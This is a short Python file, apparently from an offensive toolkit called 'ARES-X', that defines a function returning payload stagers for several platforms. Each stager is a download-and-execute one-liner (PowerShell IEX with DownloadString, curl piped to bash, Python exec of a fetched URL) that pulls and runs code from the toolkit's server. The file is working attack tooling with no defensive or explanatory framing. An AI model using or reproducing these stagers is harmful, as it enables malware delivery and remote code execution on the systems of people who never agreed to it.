# ARES-X File 23: Multi-OS Delivery Scripts
def get_stager(url, platform="powershell"):
    """Returns a one-liner to pull the payload from the ARES-X server."""
    stagers = {
        "powershell": f"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('{url}')\"",
        "bash": f"curl -sL {url} | bash",
        "python": f"python -c \"import urllib;exec(urllib.urlopen('{url}').read())\""
    }
    return stagers.get(platform, "Platform not supported.")
